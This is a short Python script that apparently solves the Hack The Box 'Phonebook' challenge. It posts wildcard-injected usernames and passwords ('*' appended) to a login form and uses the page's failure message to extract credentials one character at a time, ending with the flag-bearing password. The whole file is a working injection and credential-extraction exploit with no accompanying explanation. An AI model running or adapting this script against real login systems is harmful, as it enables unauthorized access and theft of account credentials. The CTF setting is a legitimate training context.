# Challenge: Phonebook
# https://app.hackthebox.eu/challenges/phonebook

import requests
import sys
from string import ascii_lowercase, ascii_uppercase

url = "http://xxx.xxx.xxx.xxx:xxxx/login"
chars =  ascii_lowercase + "0123456789{}!_-#$@%&[]" + ascii_uppercase + "."
username = ""
password = "HTB{"

print("")

def iterate_username(username, password):
    for char in chars:
        if char == ".":
            sys.stdout.write("\033[K") #clear line 
            print("Username: " + username);
            iterate_password(password, username)
        tmp = username + char + "*"
        print(tmp)
        sys.stdout.write("\033[F")
        data = {"username":tmp,"password":"*"}
        r = requests.post(url, data=data)

        if "You can now login using the workstation username and password!" not in r.content:
            username += char
            print(username)
            sys.stdout.write("\033[F")
            iterate_username(username, password)

def iterate_password(password, username):
    for char in chars:
        if char == ".":
            sys.stdout.write("\033[K") #clear line 
            sys.exit("Password: " + password + "\n");
        tmp = password + char + "*"
        print(tmp)
        sys.stdout.write("\033[F")
        data = {"username":username,"password":tmp}
        r = requests.post(url, data=data)

        if "You can now login using the workstation username and password!" not in r.content:
            password += char
            print(password)
            sys.stdout.write("\033[F")
            iterate_password(password, username)
 
iterate_username(username, password)